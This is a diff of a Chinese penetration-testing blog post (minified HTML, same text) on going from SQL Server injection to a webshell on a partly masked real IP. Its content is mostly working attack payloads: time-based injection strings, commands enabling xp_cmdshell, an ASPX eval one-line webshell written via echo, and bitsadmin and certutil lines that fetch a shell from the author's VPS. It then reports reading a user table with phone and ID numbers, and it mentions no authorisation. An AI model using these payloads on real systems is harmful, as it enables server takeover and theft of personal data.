@@ -1,101 +1,18 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta name="description" content="SQLServer 多语句查询 SQL 注入，读网站路径然后写 shell"/>
-  <meta name="author" content="Reber"/>
-  
-    
-      <title>从 SQL Server 注入到 getshell | Reber&#39;s Blog</title>
-    
-  
-  <link rel="stylesheet" href="/css/reset.css"/>
-  
-  <link rel="stylesheet" href="/css/smigle.css"/>
-  
-    <link rel="stylesheet" href="/css/monokai-sublime.min.css"/>
-  
-    <link rel="stylesheet" href="/css/style.css"/>
-  
-  
-    <script src="/js/jquery-3.6.0.min.js"/></script>
-  
-    <script src="/js/highlight.min.js"/></script>
-  
-    <script src="/js/style.js"/></script>
-  
-  <link rel="icon" type="image/img" sizes="16x16" href="/img/logo.png">
-  <meta name="msapplication-TileColor" content="#da532c">
-  <meta name="theme-color" content="#ffffff">
-</head>
-
-  <body>
-    <header>
-  <div id="brand">
-    <a class="icon-link" href="https://wyb0.com/">
-      <img
-        class="icon"
-        src="/img/logo.png"
-      />
-    </a>
-    <div class="text">
-      <a href="https://wyb0.com/"><h1>Reber&#39;s Blog</h1></a>
-      <h3>只会一点点编程、只会一点点渗透</h3>
-    </div>
-  </div>
-  <nav>
-    
-      
-        
-        <a href="/"><b>Home</b></a>
-      
-         | 
-        <a href="/posts/"><b>Posts</b></a>
-      
-         | 
-        <a href="/categories/"><b>Categories</b></a>
-      
-         | 
-        <a href="/tags/"><b>Tags</b></a>
-      
-         | 
-        <a href="/about/"><b>About</b></a>
-      
-         | 
-        <a href="/friends/"><b>Friends</b></a>
-      
-    
-  </nav>
-  <hr />
-</header>
-
-    <div id="content">
-      
-  <main>
-    <article>
-      <h1>从 SQL Server 注入到 getshell</h1>
-      
-<div class="post-meta">
-    <time>2019-03-02</time>
-    
-    [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/getshell">getshell</a>,<a href="/tags/SQL%E6%B3%A8%E5%85%A5">SQL注入</a>)
-</div>
-
-      <div><h3 id="0x00-目标情况">0x00 目标情况</h3>
-<ul>
-<li>一个web站点111.*.*.63，只有一个登陆框，测试了没有注入，没有弱口令</li>
-<li>扫描了全端口，没有发现什么有用的信息</li>
-</ul>
-<h3 id="0x01-发现注入">0x01 发现注入</h3>
-<p>当时是查看网页源代码，有两个可疑接口，一个是初始化密码借口，访问返回空白页面，没有什么用</p>
-<p>另一个是密码设置接口，不过这个接口是同网段的另一个ip 111.*.*.59，访问后发现是个重置密码的界面
-<img src="/img/post/Xnip2019-03-03_14-50-18.png" alt="80"></p>
-<p>但是进行密码重置的时候需要发送验证码，系统会先校验用户名是否存在，加单引号出错，and 1=2没反应</p>
-<p>burpsuite抓包后sqlmap跑了下，python sqlmap.py -r 1.txt，存在注入
-<img src="/img/post/Xnip2019-03-03_16-00-32.png" alt="80"></p>
-<p>通过sqlmap得到了这几个数据库</p>
-<pre tabindex="0"><code>[*] HSOA_20170320
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="SQLServer 多语句查询 SQL 注入，读网站路径然后写 shell"><meta name=author content="Reber"><title>从 SQL Server 注入到 getshell | Reber's Blog</title>
+<link rel=stylesheet href=/css/reset.css><link rel=stylesheet href=/css/smigle.css><link rel=stylesheet href=/css/monokai-sublime.min.css><link rel=stylesheet href=/css/style.css><script src=/js/jquery-3.6.0.min.js></script><script src=/js/highlight.min.js></script><script src=/js/style.js></script><link rel=icon type=image/img sizes=16x16 href=/img/logo.png><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"></head><body><header><div id=brand><a class=icon-link href=https://wyb0.com/><img class=icon src=/img/logo.png></a><div class=text><a href=https://wyb0.com/><h1>Reber's Blog</h1></a><h3>会一点点编程、会一点点渗透</h3></div></div><nav><a href=/><b>Home</b></a>
+|
+<a href=/posts/><b>Posts</b></a>
+|
+<a href=/categories/><b>Categories</b></a>
+|
+<a href=/tags/><b>Tags</b></a>
+|
+<a href=/about/><b>About</b></a>
+|
+<a href=/friends/><b>Friends</b></a></nav><hr></header><div id=content><main><article><h1>从 SQL Server 注入到 getshell</h1><div class=post-meta><time>2019-03-02</time>
+[<a href=/categories/Pentest>Pentest</a>](<a href=/tags/getshell>getshell</a>,<a href=/tags/SQL%E6%B3%A8%E5%85%A5>SQL注入</a>)</div><div><h3 id=0x00-目标情况>0x00 目标情况</h3><ul><li>一个web站点111.*.*.63，只有一个登陆框，测试了没有注入，没有弱口令</li><li>扫描了全端口，没有发现什么有用的信息</li></ul><h3 id=0x01-发现注入>0x01 发现注入</h3><p>当时是查看网页源代码，有两个可疑接口，一个是初始化密码借口，访问返回空白页面，没有什么用</p><p>另一个是密码设置接口，不过这个接口是同网段的另一个ip 111.*.*.59，访问后发现是个重置密码的界面
+<img src=/img/post/Xnip2019-03-03_14-50-18.png alt=80></p><p>但是进行密码重置的时候需要发送验证码，系统会先校验用户名是否存在，加单引号出错，and 1=2没反应</p><p>burpsuite抓包后sqlmap跑了下，python sqlmap.py -r 1.txt，存在注入
+<img src=/img/post/Xnip2019-03-03_16-00-32.png alt=80></p><p>通过sqlmap得到了这几个数据库</p><pre tabindex=0><code>[*] HSOA_20170320
 [*] HSOA_NEW
 [*] HSOA_T
 [*] master
@@ -104,26 +21,13 @@
 [*] Shuttle
 [*] SHWT
 [*] tempdb
-</code></pre><h3 id="0x02-找网站绝对路径">0x02 找网站绝对路径</h3>
-<ul>
-<li>判断是不是dba权限(延时后返回正确页面，确定为dba权限&lt;也可用sqlmap的&ndash;is-dba判断&gt;)</li>
-</ul>
-<pre tabindex="0"><code>uname=test&#39;;if(1=(select is_srvrolemember(&#39;sysadmin&#39;))) WAITFOR DELAY &#39;0:0:2&#39;;--
-</code></pre><ul>
-<li>判断是否是站库分离(延时后返回正确页面，确定站库没有分离)</li>
-</ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>uname<span style="color:#f92672">=</span>test<span style="color:#e6db74">&#39;;if(host_name()=@@servername) WAITFOR DELAY &#39;</span><span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">5</span><span style="color:#e6db74">&#39;;--
-</span></span></span></code></pre></div><ul>
-<li>查看是否有xp_cmdshell</li>
-</ul>
-<pre tabindex="0"><code>uname=test&#39;;if(1=(select count(*) from master.dbo.sysobjects where xtype = &#39;x&#39; and name = &#39;xp_cmdshell&#39;)) WAITFOR DELAY &#39;0:0:2&#39;--
-</code></pre><pre tabindex="0"><code>恢复／删除xp_cmdshell
+</code></pre><h3 id=0x02-找网站绝对路径>0x02 找网站绝对路径</h3><ul><li>判断是不是dba权限(延时后返回正确页面，确定为dba权限&lt;也可用sqlmap的&ndash;is-dba判断>)</li></ul><pre tabindex=0><code>uname=test&#39;;if(1=(select is_srvrolemember(&#39;sysadmin&#39;))) WAITFOR DELAY &#39;0:0:2&#39;;--
+</code></pre><ul><li>判断是否是站库分离(延时后返回正确页面，确定站库没有分离)</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span>uname<span style=color:#f92672>=</span>test<span style=color:#e6db74>&#39;;if(host_name()=@@servername) WAITFOR DELAY &#39;</span><span style=color:#ae81ff>0</span>:<span style=color:#ae81ff>0</span>:<span style=color:#ae81ff>5</span><span style=color:#e6db74>&#39;;--
+</span></span></span></code></pre></div><ul><li>查看是否有xp_cmdshell</li></ul><pre tabindex=0><code>uname=test&#39;;if(1=(select count(*) from master.dbo.sysobjects where xtype = &#39;x&#39; and name = &#39;xp_cmdshell&#39;)) WAITFOR DELAY &#39;0:0:2&#39;--
+</code></pre><pre tabindex=0><code>恢复／删除xp_cmdshell
 exec sp_addextendedproc xp_cmdshell,@dllname=&#39;xplog70.dll&#39;
 exec sp_dropextendedproc &#39;xplog70.dll&#39;
-</code></pre><ul>
-<li>开启xp_cmdshell</li>
-</ul>
-<pre tabindex="0"><code># 关闭xp_cmdshell
+</code></pre><ul><li>开启xp_cmdshell</li></ul><pre tabindex=0><code># 关闭xp_cmdshell
 EXEC sp_configure &#39;show advanced options&#39;,1;
 RECONFIGURE;
 EXEC sp_configure &#39;xp_cmdshell&#39;,0;
@@ -134,27 +38,13 @@ EXEC sp_configure &#39;show advanced options&#39;,1;
 RECONFIGURE;
 EXEC sp_configure &#39;xp_cmdshell&#39;,1;
 RECONFIGURE;
-</code></pre><ul>
-<li>得到网站绝对路径</li>
-</ul>
-<p>可以找一个在网站中的文件，然后可以用<code>dir /s /b d:\&quot;aa.txt&quot;</code>或者 for /r d:\ %i in (aa.txt) do echo %i来得到路径</p>
-<p>查看网页源代码发现引入了js脚本<code>&quot;&lt;script src=&quot;/Content/layer/layer.js&quot;&gt;&lt;/script&gt;&quot;</code>，就查找layer.js吧</p>
-<p>本来想使用sqlmap的--os-shell直接执行命令试试，python sqlmap.py -r 1.txt &ndash;os-shell，但是发现执行命令的话一直没有数据返回</p>
-<p>那就手工注入找路径，先建表，将路径插入表，然后得到表内容</p>
-<pre tabindex="0"><code>--在数据库tempdb下创建临时表tt_tmp
+</code></pre><ul><li>得到网站绝对路径</li></ul><p>可以找一个在网站中的文件，然后可以用<code>dir /s /b d:\"aa.txt"</code>或者 for /r d:\ %i in (aa.txt) do echo %i来得到路径</p><p>查看网页源代码发现引入了js脚本<code>"&lt;script src="/Content/layer/layer.js">&lt;/script>"</code>，就查找layer.js吧</p><p>本来想使用sqlmap的--os-shell直接执行命令试试，python sqlmap.py -r 1.txt &ndash;os-shell，但是发现执行命令的话一直没有数据返回</p><p>那就手工注入找路径，先建表，将路径插入表，然后得到表内容</p><pre tabindex=0><code>--在数据库tempdb下创建临时表tt_tmp
 uname=test&#39;;use tempdb;create table tt_tmp (tmp1 varchar(1000));--
-</code></pre><p>sqlmap查看建表成功，<code>sqlmap -r 1.txt --dbms &quot;Microsoft SQL Server&quot; -D &quot;tempdb&quot; --tables</code>
-<img src="/img/post/Xnip2019-03-03_18-16-01.png" alt="40"></p>
-<pre tabindex="0"><code>--查找网站文件并把路径写入到表tt_tmp
+</code></pre><p>sqlmap查看建表成功，<code>sqlmap -r 1.txt --dbms "Microsoft SQL Server" -D "tempdb" --tables</code>
+<img src=/img/post/Xnip2019-03-03_18-16-01.png alt=40></p><pre tabindex=0><code>--查找网站文件并把路径写入到表tt_tmp
 uname=test&#39;;use tempdb;insert into tt_tmp(tmp1) exec master..xp_cmdshell &#39;dir /s /b d:\layer.js&#39;;--
-</code></pre><p>用sqlmap得到表tt_tmp的内容: <code>python sqlmap.py -r 1.txt --dbms=&quot;Microsoft SQL Server&quot; --technique=S -D &quot;tempdb&quot; -T &quot;tt_tmp&quot; -C &quot;tmp1&quot; --dump -v 3</code>
-<img src="/img/post/Xnip2019-02-28_10-01-37.png" alt="65"></p>
-<h3 id="0x03-尝试在11159主机getshell">0x03 尝试在111.*.*.59主机getshell</h3>
-<ul>
-<li>尝试写一句话</li>
-</ul>
-<p>先在下面的路径中写入txt文件验证网站路径到底是哪一个</p>
-<pre tabindex="0"><code>D:\bak\20170226\bak\20170403.2\webapp\Content\layer\
+</code></pre><p>用sqlmap得到表tt_tmp的内容: <code>python sqlmap.py -r 1.txt --dbms="Microsoft SQL Server" --technique=S -D "tempdb" -T "tt_tmp" -C "tmp1" --dump -v 3</code>
+<img src=/img/post/Xnip2019-02-28_10-01-37.png alt=65></p><h3 id=0x03-尝试在11159主机getshell>0x03 尝试在111.*.*.59主机getshell</h3><ul><li>尝试写一句话</li></ul><p>先在下面的路径中写入txt文件验证网站路径到底是哪一个</p><pre tabindex=0><code>D:\bak\20170226\bak\20170403.2\webapp\Content\layer\
 D:\bak\20170226\bak\20170404.2\webapp\Content\layer\
 D:\bak\20170226\bak\20170404.3\webapp\Content\layer\
 D:\bak\20170226\bak\20170404\webapp\Content\layer\
@@ -165,77 +55,30 @@ D:\bak\20170226\bak\20180320\webapp\Content\layer\
 D:\bak\20170226\webapp\Content\layer\
 D:\bak\20170226\webappYM\Content\layer\
 D:\WEBAPP\Content\layer\
-</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>uname<span style="color:#f92672">=</span>test<span style="color:#e6db74">&#39;;exec master..xp_cmdshell &#39;</span>echo test <span style="color:#f92672">&gt;</span>D:<span style="color:#960050;background-color:#1e0010">\</span>bak<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#ae81ff">20170226</span><span style="color:#960050;background-color:#1e0010">\</span>bak<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#ae81ff">20170403</span>.<span style="color:#ae81ff">2</span><span style="color:#960050;background-color:#1e0010">\</span>webapp<span style="color:#960050;background-color:#1e0010">\</span>Content<span style="color:#960050;background-color:#1e0010">\</span>layer<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#ae81ff">11</span>.txt<span style="color:#e6db74">&#39;;--
-</span></span></span></code></pre></div><p>依次写文件然后访问，在写入 <code>D:\bak\20170226\webapp\Content\layer\123.txt</code>时，访问<code>http://111.*.*.59/Content/layer/123.txt</code>能正常访问到123.txt，返回内容为test，证明web路径就是D:\bak\20170226\webapp\</p>
-<p>尝试写入一句话(&lt; &gt;的前面要加^)</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>uname<span style="color:#f92672">=</span>test<span style="color:#e6db74">&#39;;exec master..xp_cmdshell &#39;</span>echo <span style="color:#f92672">^&lt;%@</span> Page <span style="color:#66d9ef">Language</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Jscript&#34;</span><span style="color:#f92672">%^&gt;^&lt;%</span>eval(Request.item[<span style="color:#e6db74">&#34;Aa1234567&#34;</span>],<span style="color:#e6db74">&#34;unsafe&#34;</span>);<span style="color:#f92672">%^&gt;</span> <span style="color:#f92672">&gt;</span> D:<span style="color:#960050;background-color:#1e0010">\</span>bak<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#ae81ff">20170226</span><span style="color:#960050;background-color:#1e0010">\</span>webapp<span style="color:#960050;background-color:#1e0010">\</span>Content<span style="color:#960050;background-color:#1e0010">\</span>layer<span style="color:#960050;background-color:#1e0010">\</span>cc.aspx<span style="color:#e6db74">&#39;;--
+</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span>uname<span style=color:#f92672>=</span>test<span style=color:#e6db74>&#39;;exec master..xp_cmdshell &#39;</span>echo test <span style=color:#f92672>&gt;</span>D:<span style=color:#960050;background-color:#1e0010>\</span>bak<span style=color:#960050;background-color:#1e0010>\</span><span style=color:#ae81ff>20170226</span><span style=color:#960050;background-color:#1e0010>\</span>bak<span style=color:#960050;background-color:#1e0010>\</span><span style=color:#ae81ff>20170403</span>.<span style=color:#ae81ff>2</span><span style=color:#960050;background-color:#1e0010>\</span>webapp<span style=color:#960050;background-color:#1e0010>\</span>Content<span style=color:#960050;background-color:#1e0010>\</span>layer<span style=color:#960050;background-color:#1e0010>\</span><span style=color:#ae81ff>11</span>.txt<span style=color:#e6db74>&#39;;--
+</span></span></span></code></pre></div><p>依次写文件然后访问，在写入 <code>D:\bak\20170226\webapp\Content\layer\123.txt</code>时，访问<code>http://111.*.*.59/Content/layer/123.txt</code>能正常访问到123.txt，返回内容为test，证明web路径就是D:\bak\20170226\webapp\</p><p>尝试写入一句话(&lt; >的前面要加^)</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span>uname<span style=color:#f92672>=</span>test<span style=color:#e6db74>&#39;;exec master..xp_cmdshell &#39;</span>echo <span style=color:#f92672>^&lt;%@</span> Page <span style=color:#66d9ef>Language</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Jscript&#34;</span><span style=color:#f92672>%^&gt;^&lt;%</span>eval(Request.item[<span style=color:#e6db74>&#34;Aa1234567&#34;</span>],<span style=color:#e6db74>&#34;unsafe&#34;</span>);<span style=color:#f92672>%^&gt;</span> <span style=color:#f92672>&gt;</span> D:<span style=color:#960050;background-color:#1e0010>\</span>bak<span style=color:#960050;background-color:#1e0010>\</span><span style=color:#ae81ff>20170226</span><span style=color:#960050;background-color:#1e0010>\</span>webapp<span style=color:#960050;background-color:#1e0010>\</span>Content<span style=color:#960050;background-color:#1e0010>\</span>layer<span style=color:#960050;background-color:#1e0010>\</span>cc.aspx<span style=color:#e6db74>&#39;;--
 </span></span></span></code></pre></div><p>访问时可以看到aa.aspx确实写入了，但是菜刀连接不上
-<img src="/img/post/Xnip2019-03-03_20-25-24.png" alt="70"></p>
-<ul>
-<li>尝试直接下载shell到服务器</li>
-</ul>
-<p>使用bitsadmin下载时并没有成功，访问<code>http://111.*.*.59/Content/layer/aaa.aspx</code>返回404</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>uname<span style="color:#f92672">=</span>test<span style="color:#e6db74">&#39;;exec master..xp_cmdshell &#39;</span>bitsadmin <span style="color:#f92672">/</span>rawreturn <span style="color:#f92672">/</span>transfer getfile http:<span style="color:#f92672">//</span>my<span style="color:#f92672">-</span>vps<span style="color:#f92672">/</span>aaa.aspx D:<span style="color:#960050;background-color:#1e0010">\</span>bak<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#ae81ff">20170226</span><span style="color:#960050;background-color:#1e0010">\</span>webapp<span style="color:#960050;background-color:#1e0010">\</span>Content<span style="color:#960050;background-color:#1e0010">\</span>layer<span style="color:#960050;background-color:#1e0010">\</span>aaa.aspx<span style="color:#e6db74">&#39;;--
-</span></span></span></code></pre></div><p>使用certutil下载时才成功，得到shell地址<code>http://111.*.*.59/Content/layer/aaa.aspx</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>uname<span style="color:#f92672">=</span>test<span style="color:#e6db74">&#39;;exec master..xp_cmdshell &#39;</span>certutil <span style="color:#f92672">-</span>urlcache <span style="color:#f92672">-</span>split <span style="color:#f92672">-</span>f http:<span style="color:#f92672">//</span>my<span style="color:#f92672">-</span>vps<span style="color:#f92672">/</span>aaa.aspx D:<span style="color:#960050;background-color:#1e0010">\</span>bak<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#ae81ff">20170226</span><span style="color:#960050;background-color:#1e0010">\</span>webapp<span style="color:#960050;background-color:#1e0010">\</span>Content<span style="color:#960050;background-color:#1e0010">\</span>layer<span style="color:#960050;background-color:#1e0010">\</span>aaa.aspx<span style="color:#e6db74">&#39;;--
-</span></span></span></code></pre></div><p><img src="/img/post/Xnip2019-03-03_20-42-24.png" alt="70"></p>
-<h3 id="0x04-查数据库相关信息">0x04 查数据库相关信息</h3>
-<ul>
-<li>
-<p>找到数据库配置文件
-<img src="/img/post/Xnip2019-03-05_10-25-52.png" alt="80">
-<img src="/img/post/Xnip2019-03-05_10-34-10.png" alt="90">
-<img src="/img/post/Xnip2019-03-05_10-37-28.png" alt="90"></p>
-</li>
-<li>
-<p>尝试登陆</p>
-</li>
-</ul>
-<p>找到了用户表，有用户名、密码、姓名、手机号、邮箱、身份证号
-<img src="/img/post/Xnip2019-03-05_11-00-44.png" alt="80">
+<img src=/img/post/Xnip2019-03-03_20-25-24.png alt=70></p><ul><li>尝试直接下载shell到服务器</li></ul><p>使用bitsadmin下载时并没有成功，访问<code>http://111.*.*.59/Content/layer/aaa.aspx</code>返回404</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span>uname<span style=color:#f92672>=</span>test<span style=color:#e6db74>&#39;;exec master..xp_cmdshell &#39;</span>bitsadmin <span style=color:#f92672>/</span>rawreturn <span style=color:#f92672>/</span>transfer getfile http:<span style=color:#f92672>//</span>my<span style=color:#f92672>-</span>vps<span style=color:#f92672>/</span>aaa.aspx D:<span style=color:#960050;background-color:#1e0010>\</span>bak<span style=color:#960050;background-color:#1e0010>\</span><span style=color:#ae81ff>20170226</span><span style=color:#960050;background-color:#1e0010>\</span>webapp<span style=color:#960050;background-color:#1e0010>\</span>Content<span style=color:#960050;background-color:#1e0010>\</span>layer<span style=color:#960050;background-color:#1e0010>\</span>aaa.aspx<span style=color:#e6db74>&#39;;--
+</span></span></span></code></pre></div><p>使用certutil下载时才成功，得到shell地址<code>http://111.*.*.59/Content/layer/aaa.aspx</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span>uname<span style=color:#f92672>=</span>test<span style=color:#e6db74>&#39;;exec master..xp_cmdshell &#39;</span>certutil <span style=color:#f92672>-</span>urlcache <span style=color:#f92672>-</span>split <span style=color:#f92672>-</span>f http:<span style=color:#f92672>//</span>my<span style=color:#f92672>-</span>vps<span style=color:#f92672>/</span>aaa.aspx D:<span style=color:#960050;background-color:#1e0010>\</span>bak<span style=color:#960050;background-color:#1e0010>\</span><span style=color:#ae81ff>20170226</span><span style=color:#960050;background-color:#1e0010>\</span>webapp<span style=color:#960050;background-color:#1e0010>\</span>Content<span style=color:#960050;background-color:#1e0010>\</span>layer<span style=color:#960050;background-color:#1e0010>\</span>aaa.aspx<span style=color:#e6db74>&#39;;--
+</span></span></span></code></pre></div><p><img src=/img/post/Xnip2019-03-03_20-42-24.png alt=70></p><h3 id=0x04-查数据库相关信息>0x04 查数据库相关信息</h3><ul><li><p>找到数据库配置文件
+<img src=/img/post/Xnip2019-03-05_10-25-52.png alt=80>
+<img src=/img/post/Xnip2019-03-05_10-34-10.png alt=90>
+<img src=/img/post/Xnip2019-03-05_10-37-28.png alt=90></p></li><li><p>尝试登陆</p></li></ul><p>找到了用户表，有用户名、密码、姓名、手机号、邮箱、身份证号
+<img src=/img/post/Xnip2019-03-05_11-00-44.png alt=80>
 在111.*.*.63登陆发现它只是个登陆接口，真正网站是在111.*.*.59的
-<img src="/img/post/Xnip2019-03-05_11-03-08.png" alt="60"></p>
-<h3 id="0x05-附sqlmap得到路径的语句分析">0x05 附：sqlmap得到路径的语句分析</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>cast转换数据类型
-</span></span><span style="display:flex;"><span>isnull判断数据是否为空<span style="color:#960050;background-color:#1e0010">，为空的话返回</span>char(<span style="color:#ae81ff">32</span>)
-</span></span><span style="display:flex;"><span>unicode字符转换为10进制数字
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">IF</span>(UNICODE(<span style="color:#66d9ef">SUBSTRING</span>((<span style="color:#66d9ef">SELECT</span> <span style="color:#66d9ef">MIN</span>(<span style="color:#66d9ef">ISNULL</span>(<span style="color:#66d9ef">CAST</span>(tmp1 <span style="color:#66d9ef">AS</span> NVARCHAR(<span style="color:#ae81ff">4000</span>)),CHAR(<span style="color:#ae81ff">32</span>))) <span style="color:#66d9ef">FROM</span> tempdb.dbo.tt_tmp),<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>))<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">32</span>) WAITFOR DELAY <span style="color:#e6db74">&#39;0:0:1&#39;</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">IF</span>(UNICODE(<span style="color:#66d9ef">SUBSTRING</span>((<span style="color:#66d9ef">SELECT</span> <span style="color:#66d9ef">MIN</span>(<span style="color:#66d9ef">ISNULL</span>(<span style="color:#66d9ef">CAST</span>(tmp1 <span style="color:#66d9ef">AS</span> NVARCHAR(<span style="color:#ae81ff">4000</span>)),CHAR(<span style="color:#ae81ff">32</span>))) <span style="color:#66d9ef">FROM</span> tempdb.dbo.tt_tmp <span style="color:#66d9ef">WHERE</span> <span style="color:#66d9ef">CONVERT</span>(NVARCHAR(<span style="color:#ae81ff">4000</span>),tmp1)<span style="color:#f92672">&gt;</span><span style="color:#e6db74">&#39;D:\WEBAPP\Content\layer\layer.js&#39;</span>),<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>))<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">16</span>) WAITFOR DELAY <span style="color:#e6db74">&#39;0:0:1&#39;</span>;
-</span></span></code></pre></div><h4 id="reference侵删">Reference(侵删)：</h4>
-<ul>
-<li><a href="https://www.cnblogs.com/backlion/p/6869595.html?_blank">https://www.cnblogs.com/backlion/p/6869595.html</a></li>
-</ul>
-</div>
-    </article>
-  </main>
-
-    </div>
-    <footer>
-  <hr />
-  
-    <p id="social">
-      Find me around the web:
-      
-        
-        <a href="https://github.com/reber0?_blank">GitHub</a>
-      
-         • 
-        <a href="https://weibo.com/u/5819760166?_blank">Weibo</a>
-      
-    </p>
-  
-  <p class="copyright">
-    Copyright © 2015-2024
-    <a href="https://wyb0.com/"><strong>Reber</strong></a>.
-
-    Built with
-    <a href="http://www.gohugo.io/">Hugo</a>,
-    based on the theme
-    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>.
-  </p>
-</footer>
-
-  </body>
-</html>
+<img src=/img/post/Xnip2019-03-05_11-03-08.png alt=60></p><h3 id=0x05-附sqlmap得到路径的语句分析>0x05 附：sqlmap得到路径的语句分析</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span>cast转换数据类型
+</span></span><span style=display:flex><span>isnull判断数据是否为空<span style=color:#960050;background-color:#1e0010>，为空的话返回</span>char(<span style=color:#ae81ff>32</span>)
+</span></span><span style=display:flex><span>unicode字符转换为10进制数字
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>IF</span>(UNICODE(<span style=color:#66d9ef>SUBSTRING</span>((<span style=color:#66d9ef>SELECT</span> <span style=color:#66d9ef>MIN</span>(<span style=color:#66d9ef>ISNULL</span>(<span style=color:#66d9ef>CAST</span>(tmp1 <span style=color:#66d9ef>AS</span> NVARCHAR(<span style=color:#ae81ff>4000</span>)),CHAR(<span style=color:#ae81ff>32</span>))) <span style=color:#66d9ef>FROM</span> tempdb.dbo.tt_tmp),<span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>1</span>))<span style=color:#f92672>&gt;</span><span style=color:#ae81ff>32</span>) WAITFOR DELAY <span style=color:#e6db74>&#39;0:0:1&#39;</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>IF</span>(UNICODE(<span style=color:#66d9ef>SUBSTRING</span>((<span style=color:#66d9ef>SELECT</span> <span style=color:#66d9ef>MIN</span>(<span style=color:#66d9ef>ISNULL</span>(<span style=color:#66d9ef>CAST</span>(tmp1 <span style=color:#66d9ef>AS</span> NVARCHAR(<span style=color:#ae81ff>4000</span>)),CHAR(<span style=color:#ae81ff>32</span>))) <span style=color:#66d9ef>FROM</span> tempdb.dbo.tt_tmp <span style=color:#66d9ef>WHERE</span> <span style=color:#66d9ef>CONVERT</span>(NVARCHAR(<span style=color:#ae81ff>4000</span>),tmp1)<span style=color:#f92672>&gt;</span><span style=color:#e6db74>&#39;D:\WEBAPP\Content\layer\layer.js&#39;</span>),<span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>1</span>))<span style=color:#f92672>&gt;</span><span style=color:#ae81ff>16</span>) WAITFOR DELAY <span style=color:#e6db74>&#39;0:0:1&#39;</span>;
+</span></span></code></pre></div><h4 id=reference侵删>Reference(侵删)：</h4><ul><li><a href=https://www.cnblogs.com/backlion/p/6869595.html?_blank>https://www.cnblogs.com/backlion/p/6869595.html</a></li></ul></div></article></main></div><footer><hr><p id=social>Find me around the web:
+<a href=https://github.com/reber0?_blank>GitHub</a>
+•
+<a href=https://weibo.com/u/5819760166?_blank>Weibo</a></p><p class=copyright>Copyright © 2015-2025
+<a href=https://wyb0.com/><strong>Reber</strong></a>.
+Built with
+<a href=http://www.gohugo.io/>Hugo</a>,
+based on the theme
+<a href=https://gitlab.com/ian-s-mcb/smigle-hugo-theme>smigle</a>.</p></footer></body></html>
